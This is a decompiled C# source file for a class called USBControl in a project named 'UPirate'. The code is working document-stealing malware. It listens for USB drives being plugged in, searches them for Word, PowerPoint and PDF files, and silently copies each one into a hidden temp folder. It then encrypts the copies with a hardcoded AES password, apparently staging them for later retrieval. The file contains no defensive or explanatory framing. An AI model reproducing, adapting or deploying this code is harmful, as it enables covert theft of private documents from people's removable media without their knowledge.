using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Management;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace UPirate;

public class USBControl
{
	private ManagementEventWatcher watcherAttach;

	private ManagementEventWatcher watcherRemove;

	private StreamWriter file;

	private string path;

	public USBControl()
	{
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		path = Path.GetTempPath() + "UP\\ulog.txt";
		if (!Directory.Exists(Path.GetTempPath() + "\\UP"))
		{
			Directory.CreateDirectory(Path.GetTempPath() + "\\UP");
		}
		if (!File.Exists(path))
		{
			using StreamWriter streamWriter = File.CreateText(path);
			streamWriter.WriteLine("File Successfully Created at " + DateTime.Now);
		}
		watcherAttach = new ManagementEventWatcher();
		watcherAttach.add_EventArrived(new EventArrivedEventHandler(watcher_EventArrived));
		watcherAttach.set_Query((EventQuery)new WqlEventQuery("SELECT * FROM Win32_DeviceChangeEvent WHERE EventType = 2"));
		watcherAttach.Start();
		watcherRemove = new ManagementEventWatcher();
		watcherRemove.add_EventArrived(new EventArrivedEventHandler(watcher_EventRemoved));
		watcherRemove.set_Query((EventQuery)new WqlEventQuery("SELECT * FROM Win32_DeviceChangeEvent WHERE EventType = 3"));
		watcherRemove.Start();
	}

	public void Dispose()
	{
		watcherAttach.Stop();
		watcherRemove.Stop();
		((Component)(object)watcherAttach).Dispose();
		((Component)(object)watcherRemove).Dispose();
	}

	public List<string> GetAllFilesFromFolder(string root, bool searchSubfolders, string ext)
	{
		Queue<string> queue = new Queue<string>();
		List<string> list = new List<string>();
		queue.Enqueue(root);
		while (queue.Count != 0)
		{
			string text = queue.Dequeue();
			try
			{
				string[] files = Directory.GetFiles(text, "*." + ext + "*", SearchOption.TopDirectoryOnly);
				list.AddRange(files);
			}
			catch
			{
			}
			try
			{
				if (searchSubfolders)
				{
					string[] directories = Directory.GetDirectories(text, "*.*", SearchOption.TopDirectoryOnly);
					string[] array = directories;
					foreach (string item in array)
					{
						queue.Enqueue(item);
					}
				}
			}
			catch
			{
			}
		}
		return list;
	}

	private void watcher_EventArrived(object sender, EventArrivedEventArgs e)
	{
		string[] array = null;
		bool flag = false;
		Console.WriteLine("Fired..");
		IList<string> list = new List<string>();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.DriveType != DriveType.Removable || !driveInfo.IsReady)
			{
				continue;
			}
			list.Add(driveInfo.RootDirectory.FullName);
			string[] array2 = new string[5] { "docx", "doc", "ppt", "pptx", "pdf" };
			if (File.Exists(path))
			{
				array = File.ReadAllLines(path);
			}
			try
			{
				string[] array3 = array2;
				foreach (string ext in array3)
				{
					List<string> allFilesFromFolder = GetAllFilesFromFolder(driveInfo.RootDirectory.FullName, searchSubfolders: true, ext);
					foreach (string item in allFilesFromFolder)
					{
						try
						{
							using StreamWriter streamWriter = File.AppendText(path);
							string[] array4 = array;
							foreach (string text in array4)
							{
								if (item == text)
								{
									flag = true;
								}
							}
							if (!flag)
							{
								streamWriter.WriteLine(item);
								flag = false;
							}
						}
						catch (Exception)
						{
						}
					}
				}
				string[] array5 = File.ReadAllLines(path);
				string[] array6 = array5;
				foreach (string text2 in array6)
				{
					if (!text2.Contains("File Successfully Created at ") && !File.Exists(Path.GetTempPath() + "UP\\" + Path.GetFileName(text2)))
					{
						File.Copy(text2, Path.Combine(Path.GetTempPath(), "UP\\" + Path.GetFileName(text2)), overwrite: false);
						AES_Encrypt(Path.Combine(Path.GetTempPath(), "UP\\" + Path.GetFileName(text2)), "alpha1beta2gamma3");
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private void watcher_EventRemoved(object sender, EventArrivedEventArgs e)
	{
		Console.WriteLine("Removed..");
	}

	~USBControl()
	{
		Dispose();
	}

	private void AES_Encrypt(string inputFile, string password)
	{
		byte[] array = GenerateRandomSalt();
		FileStream fileStream = new FileStream(inputFile + ".aes", FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				Application.DoEvents();
				cryptoStream.Write(array2, 0, count);
			}
			fileStream2.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			cryptoStream.Close();
			fileStream.Close();
		}
	}

	private void AES_Decrypt(string inputFile, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		byte[] array = new byte[32];
		FileStream fileStream = new FileStream(inputFile, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		rijndaelManaged.Mode = CipherMode.CFB;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
		FileStream fileStream2 = new FileStream(inputFile + ".decrypted", FileMode.Create);
		byte[] array2 = new byte[1048576];
		try
		{
			int count;
			while ((count = cryptoStream.Read(array2, 0, array2.Length)) > 0)
			{
				Application.DoEvents();
				fileStream2.Write(array2, 0, count);
			}
		}
		catch (CryptographicException)
		{
		}
		catch (Exception)
		{
		}
		try
		{
			cryptoStream.Close();
		}
		catch (Exception)
		{
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}
}
